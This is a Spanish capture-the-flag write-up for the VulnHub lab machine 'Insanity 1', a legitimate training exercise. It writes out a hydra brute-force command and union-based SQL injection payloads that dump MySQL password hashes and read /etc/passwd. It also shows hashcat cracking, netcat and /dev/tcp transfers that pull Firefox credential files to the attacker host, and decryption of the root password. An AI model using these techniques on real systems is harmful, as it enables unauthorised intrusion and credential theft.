---
layout: single
title: Insanity 1: VulnHub
excerpt: "Mediante una enumeración web descubriremos paneles de login, cual mediante fuerza bruta sacaremos la contraseña, y abusaremos mediante la explotación de inyecciones SQL (SQLi) dentro de un correo. Posteriormente, se extraen credenciales del sistema desde una base datos y se descifran archivos de perfil de Firefox (logins.json y key4.db) para escalar privilegios hasta la cuenta de root."
date: 2026-07-18
classes: wide
header:
  teaser: /assets/images/vlh-writeup-insanity1/Pasted image 20260718135758.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - Pentesting
tags:
  - writeup
  - eWPT
  - FTP-Enum
  - HackingWeb
  - Fuzzing
  - VirtualHosting
  - BruteForceOnAuthPanel
  - SquirrelMail-Enum
  - SQLI-SquirrelMail-INBOX
  - EscaladaPrivilegios
  - Credentials-FirefoxProfile
---

## WRITE UP
Ejemplo: 192.168.1.164 (víctima) TTL= 64 LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Insanity</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 192.168.1.164
```

Usar el comando *ping*:

```bash
ping 192.168.1.164 -c 1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 192.168.1.164 -oN allPorts
# Veremos porque el formato grepeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports allPorts
```

```bash
nmap -sVC -p21,22,80 192.168.1.164 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

### ANÁLISIS FTP: RECONOCIMIENTO
De primeras tenemos el puerto 21 por donde corre el ftp, en cuanto a vulnerabilidades por versión respecta a **vsftpd** vemos que es una vieja (<span style="color:yellow">vsftpd 3.0.3</span>) pero que si echamos un vistazo con *searchsploit* no veremos ningún exploit disponible.

```bash
searchsploit vsftpd 3.0.2
```

En el escaneo de nmap gracias a uno de los scripts nos detecto un login en <span style="color:blue">anonymos</span>:

```bash
locate .nse | grep -i "ftp"
```

Entonces accederemos en busca de alguna credencial útil, sino tocara seguir explorando otros puertos.

```bash
ftp 192.168.1.164

USER: anonymous
PASS: <NO_PASS>
```

Vemos un directorio "<span style="color:lightblue">pub</span>" que al intentar listar el contenido nos dice que hay un error con el modo etc... De hecho nmap ya nos avisa de este error. Pasamos al ssh.

>En modo **binary** tampoco va.

Tampoco tenemos capacidad para subir archivos:

### ANÁLISIS SSH: RECONOCIMIENTO
Por el puerto 22 de ssh tenemos corriendo la típica versión de openssh cual nos permite enumerar usuarios. 

```bash
searchsploit openssh 7.4
```

De momento nos esperaremos haber si tenemos otras vías visibles para la intrusión a la máquina o alguna credencial válida.

### ANÁLISIS WEB: RECONOCIMIENTO
Como teníamos un servidor web disponible, uso el script "`http-robots.txt`" de *nmap* para ver si nos detecta algún fichero robots.txt y poder sacar algún tipo de información relevante.

En este caso no nos lo detecta, no quiere decir que no exista.

```bash
nmap -sV --script "http-robots.txt" -p80 192.168.1.164
```

Con *whatweb* haremos un reconocimiento por consola a nivel web para saber con que tecnologías, lenguaje, etc... vamos a tratar.

```bash
whatweb http://192.168.1.164/
```

>Vemos que el servidor de apache esta alojado en la distribución de Linux llamada *CentOS*.

Aparentemente vemos que trata de una empresa dedicada al alojamiento en la nube. Arriba tenemos un email cual tenemos en cuenta el dominio por si en un futuro tenemos que enumerar subdominios: *insanityhosting.vm*

Abajo del todo como en las pestañas de la imagen anterior, también se ve que la empresa ofrece un servicio de Monitorio para nuestro servidor a tiempo real y con avisos a nuestro correo. Le damos a empezar.

Nos llevará al panel de login del Monitor. Desconocemos las credenciales por lo que no podemos hacer nada.

Con <span style="color:lightyellow">Wappalyzer</span> podemos ver las tecnologías de una forma más visual, es igual que *whatweb*.
Como teníamos de lenguaje PHP y suele ser vulnerable a SQLi probaremos a nivel de login.

Podemos probar diferentes combinaciones como con inyecciones SQL o credenciales típicas de Administrador pero no dejará, tampoco saldrá ningún error que nos guíe que falla.

>En el código fuente no hay nada del login.

En la página anterior tampoco. Lo único relevante dos directorios en la raíz con fotos. 

### FUZZING A DIRECTORIOS NIVEL WEB
Con la herramienta *gobuster* haremos Fuzzing para descubrir directorios a nivel web potenciales para encontrar algo de información.

```bash
gobuster dir -u http://192.168.1.164/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list.2.3.medium.txt --no-error -x .txt .php .xml .html .htm -t 50
```

Vemos 3 directorios nuevos importantes: <span style="color:lightblue">phpmyadmin</span>, <span style="color:lightblue">news</span>  y <span style="color:lightblue">webmail</span>.

### phpMyAdmin
El primero trata de **phpMyAdmin**:

Dentro, unos llevare a su panel sesión cual desconocemos las credenciales.
Hay versiones en las cuales con poner `root` o `root:root` nos deja acceder.

En este caso no.

### News Blog: VIRTUAL HOSTING
El segundo directorio trata de un portal de blog sobre noticias del la empresa. Pero no se esta aplicando *Virtual hosting* por ello no vemos los elementos a nivel web.

Nos iremos al código fuente del portal ("**CTRL + U**").
Aquí veremos que los recursos apuntan a un subdominio llamado: <mark style="background: #FFF3A3A6;">www.insanityhosting.vm</mark>

Lo agregaremos a nuestro fichero <span style="color:lightblue">/etc/</span>**hosts** para que nuestro sistema asocie la IP a dicho dominio y poder leer los recursos que interpreta el servidor, de paso metemos el dominio del principio por si acaso nos hace falta:

```bash
192.168.1.164 www.insanityhosting.vm insanityhosting.vm
```

Al entrar ya veremos que se cargan todos los elementos, permitiéndonos visualizar el portal de noticias.

>Nos habla de un usuario llamado <span style="color:blue">Otis</span> que ha dirigido al equipo y que le permiten el acceso a su Monitor de servicio que vimos al principio.

### SquirrelMail
Este tercero como su nombre indica es un servicio que te deja ver y usar tu correo electrónico directo en un navegador de internet sin necesidad de instalar ningún software ni nada por el estilo. Nos  llevará a un Panel de sesión de *SquirrelMail*.

Una búsqueda rápida en Google y nos dice que este servicio esta inactivo desde 2011 y no se ha vuelto a actualizar.

Podemos probar a inyecciones SQL pero no es vulnerable.

Al fallar las credenciales esta vez si nos sale error.

### FUERZA BRUTA A NIVEL WEB: HYDRA
Si recordamos al principio, teníamos un servicio para Monitorear nuestros servidores a nivel de conectividad. Y decía que nos avisaba a nuestro correo sobre el estado del mismo. 

Como teníamos un usuario potencial llamado <span style="color:blue">Otis</span> que tiene acceso al servicio de Monitoreo, lo usaremos para hacer fuerza bruta con *hydra* al panel de webmail ya que ahí tenemos el error de login.

Otra forma para ver el error es ir al código fuente, de la página del error:

Como los requisitos para hacer fuerza bruta al puerto http es tener los campos de formulario y demás, capturaremos la petición con *Burp Suite*. Activamos el Proxy con la extensión <span style="color:lightyellow">FoxyProxy</span>.

Dentro de este, nos iremos a "**Proxy** > **Intercept on**".

Nos iremos al Panel de sesión y introduciremos unas credenciales cualquiera, y al volver al Burp Suite habremos capturado la petición.

Nos quedamos con los campos de formulario y demás.

Otra forma sería ver como viaja la petición a través de la web. Para ello apretamos "**CTRL + ALT +I**" y nos vamos a la pestaña "*Network*".

Una vez enviado recibiremos esta petición por *POST* cual contendrá los campos.

Quedándonos la siguiente sintaxis de **hydra**:

```bash
hydra -l otis -P /usr/share/wordlists/rockyou.txt -v 192.168.1.164 http-post-form "/webmail/src/redirect.php:login_username=otis&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

>Nos encontrara las siguientes credenciales: <span style="color:blue">otis</span>:<span style="color:darkred">123456</span>

### ACCESO WEB: SQUIRREMAIL
Con las credenciales probamos a acceder al servicio de e-mail.

Nos deja.

### ACCESO WEB: SERVICIO DE MONITOREO
Con las credenciales probamos a acceder al servicio de Monitoreo web.

Nos deja.

##### ACCESO WEB: phpMyAdmin
Como dijimos antes hay versiones en las cuales si un usuario es válido no solicita la contraseña, así que probamos.

Nos deja acceder, pero no podremos hacer nada. Sin embargo, como esta MySQL por detrás quizás sea vulnerable a *SQLI*.

### ¿COMO FUNCIONA: Monitor + Email?
Vamos a hacer una prueba para entender como funciona. Añadiremos un servidor fake cual nos inventaremos la IP (Ponemos lo que sea). 

En la lista de "Sever Status" se ve que el Status es **Down**. Entonces nos debe llegar al email una notificación sobre que nuestro servidor esta caido.

Si esperamos, efectivamente nos llega a nuestro webmail, en el correo le damos a "<span style="color:blue">WARNING</span>" para leerlo.

Nos dice que el servidor "Test" esta caído. Abajo del mismo, hay 4 tablas (huecos) correspondiente 1 base de datos, con los datos de nuestro servidor. 

>Las mismas tablas que vemos en el servicio de Monitoreo.

### PROBAR CONECTIVIDAD: PING (ICMP)
Como el servicio de monitoreo comprueba la conectividad de nuestros servidores pues lo más posible esque use el protocolo ICMP mediante el comando *Ping*. Para comprobarlo usaremos *tcpdump* para ponernos a la escucha de trazas ICMP que nos lleguen a nuestro kali, mediante la IP.

Añadimos la IP de nuestro kali en el Monitor.

De forma paralela nos ponemos a la escucha:

```bash
sudo tcpdump -l -i eth0 icmp -n
```

Tras esperar un rato veremos que recibimos una traza ICMP del servidor víctima a nivel sistema y que nosotros le respondemos con otra.

### OTRAS POSIBLES INYECCIONES
En la IP podemos probar `IP;comando` que queremos interpretar.

Nos dice que el servidor esta caído, así que vamos a ver la salida del correo.

Nada interesante.

### VULNERABILIDAD WEB: SQLi (Structured Query Language): PROBAR SI ES VULNERABLE
Para empezar a probar las inyecciones SQL tendremos en cuenta el `""` ya que en la columna de **Date Time** aparece así, y alomejor entre `''` no le gusta.

```bash
Test" OR 1=1-- -      
```

Vemos que en la salida del correo, es muy larga, y en donde la tabla "**Host**" nos ha listado la de todos los servidores, en este caso la mía y la del propio servidor víctima (Localhost).

Esto quiere decir que es vulnerable a **SQLi**.

Como no podemos borrar o modificar los servidores actuales de la lista de "Servers Status" en el Monitor cuales les hemo metido inyecciones, vamos ahorrarnos ciertas cosas y vamos a ir al grano. 

### LISTAR BASES DE DATOS ACTIVAS
Listaremos todas las bases de datos activas en el hueco (4).

```bash
" UNION SELECT 1,2,3,SCHEMA_NAME FROM information_schema.SCHEMATA -- -
```

Veremos las siguientes bases de datos activas:

### LISTAR TODAS LAS TABLAS DE LA DB: mysql
Como seguramente haya cualquier tipo de credencial en la base de datos **mysql**, listaremos sus tablas.

```bash
" UNION SELECT 1,2,3,table_name FROM information_schema.tables WHERE table_schema="mysql" -- -
```

De las tablas enumeradas, nos quedaremos con *user*.

### LISTAR TODAS LAS COLUMNAS DE LA TABLA: user
Ahora listaremos las columnas de dicha tabla en cuanto a nivel enumeración respecta.

```bash
" UNION SELECT 1,2,3,column_name FROM information_schema.columns WHERE table_name="user" -- -
```

Nos quedaremos con las columnas: **User**, **Password** y **authentication_String**.

### CONCATENAR COLUMNAS ESPECÍFICAS DE LA TABLA: mysql.user
Es importante el authentication_string, porque al enumerar puede que no enumere nada de la columna **Password**.

>Más información al respecto: https://stackoverflow.com/questions/30692812/mysql-user-db-does-not-have-password-columns-installing-mysql-on-osx

Para mostrar el contenido de las columnas, lo que hare será concatenar las columnas que quiera ver con `:` codeado a hexadecimal para separarlas.

```bash
" UNION SELECT 1, 2, 3, CONCAT(User, 0x3a, Password, 0x3a, authentication_string) FROM mysql.user -- -
```

En la salida del correo vemos a dos usuarios: <span style="color:blue">root</span> y <span style="color:blue">elliot</span> con sus respectivos hashes a nivel de MySQL.

### LEER ARCHIVOS ARBITRARIOS/INTERNOS A NIVEL SISTEMA
Una de las cosas que podemos hacer es leer archivos a nivel sistema. Si tenemos permisos podremos incluso leer archivos arbitrarios. Intentaremos leer <span style="color:lightblue">/etc/</span>**passwd**.

```bash
" UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4 as result -- -
```

Nos ha dejado visualizarlo, pudiendo listar los siguientes usuarios: <span style="color:blue">root</span>, <span style="color:blue">elliot</span>, <span style="color:blue">admin</span>, <span style="color:blue">nicholas</span> y <span style="color:blue">monitor</span> a nivel sistema.

### CRACK PASSWORD
Como tenemos dos hashes a crackear en formato MySQL, usaremos *hashcat*.

Crackearemos la del usuario <span style="color:blue">elliot</span>:

> Página para ver los tipos de hashes y su respectivo decimal: https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
# Especicamos el modo de MySql [300]
hashcat -m 300 -a 0 hash2_elliot /usr/share/wordlists/rockyou.txt

# Mostramos el resultado [Yo ya lo habia crackeado]
hashcat --show -m 300 hash2_elliot

PASS -> elliot123
```

Si intentamos crakear la de root, ninguna contraseña del diccionario será válida **(Exhausted)**:

### ACCESO A SSH
Como tenemos credenciales potenciales, probaremos a entrar por ssh.
Dejándonos exitosamente.

```bash
# Entrar en el servidor de ssh
ssh elliot@192.168.1.166

USER: elliot
PASS: elliot123

# Tratamiento de la TTY
export TERM=xterm
```

### ESCALADA DE PRIVILEGIOS
A simple vista se ve un directorio oculto en el directorio personal de Elliot, lo cual es la del navegador **Mozilla Firefox**. Siguiendo la ruta habitual del navegador, llegamos a la carpeta de su perfil (`esmhp32w.default-default`), donde se almacenan datos cifrados que no son legibles a simple vista.

Usaremos la herramienta *Firepwd* para extraer en texto plano la contraseña almacenada en este perfil.

Necesitaremos los archivos: *key4.db* y *logins.json*.

```bash
python3 firepwd.py
```

### TRANFERENCIA DE CONTENIDO DE ARCHIVOS
Como necesitamos que la herramienta apunte a estos dos archivos, nos las traeremos hacia nuestra máquina de atacante mediante la técnica *dev tcp transfer listener*.

Par ello nos pondremos a la escucha por el puerto <span style="color:purple">443</span>, y el contneido que recibamos a nuestra conexión, lo guardo en un archivo llamado *key4.db*.

```bash
nc -nlvp 443 > key4.db
```

De forma paralela en el servidor de ssh víctima, leo el contenido de key4.db y la salida lo mando a mi host por el puerto 443, que cual recibirá el netcat.

```bash
cat < key4.db > /dev/tcp/192.168.1.165/443
```

Nos dice que hemos tenido una conexión a la máquina víctima, dejándonos el contenido del key4.db original en el nuestro.

Hacemos lo mismo pero con el archivo *logins.json*.

```bash
nc -nlvp 443 > logins.json
```

Nos pasamos el contenido a nuestra conexión por el puerto 443.

```bash
cat < logins.json > /dev/tcp/192.168.1.165/443
```

Lo hemos recibido correctamente.

### CORRECIÓN ERROR CÓDIGO: FIREPWD.PY
Hay veces que ya teniendo los archivos y usamos la herramienta, nos salta este error de abajo, cual nos sale por el tamaño del cifrado...

La solución para esto es forzar las claves de 24 bytes a usar `DES3` con su tamaño de bloque nativo de 8 bytes, para ello hay que corregir el algoritmo de cifrado y limpiar los bytes de relleno, lo que permite descifrar la clave privada y las contraseñas de `logins.json` sin que fallara el parser `ASN.1`.

Cambiamos esta parte del código original de la herramienta Firepwd.py:

Por esto otro:

```bash
if len(key) == 24:  # 3DES
    print('Using 3DES (24-byte key)')
    final_key = key[:24]
    cipher_class = DES3
    block_size = DES3.block_size
elif len(key) in (32, 48):  # AES
    print('Using AES-256')
    final_key = key[:32]
    cipher_class = AES
    block_size = AES.block_size
else:
    print(f"Error: Unexpected key length {len(key)}.")
    sys.exit()
```

### EXTRACCIÓN DE CREDENCIALES FIREFOX PROFILE
Una vez cambiado, al ejecutar la herramienta en el directorio donde están los archivos, ya no nos saldrá ningún error y nos descifrara el usuario y la contraseña.

```bash
python3 firepwd.py
```

Como tenemos unas credenciales de root nos convertiremos en el.

```bash
# Convertirnos en el usuario root
su root

PASS: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa

# Verificar nuestros permisos y grupos a los que pertenecemos
id

# Verificar el usuario de la sesión actual
whoami
```

### BANDERA ROOT
Como ya somos root, solo nos queda ir a su directorio y leer la bandera para resolver la bandera.

```bash
# Ir al directorio de root
cd /root

# Leer la bandera
cat flag.txt
```

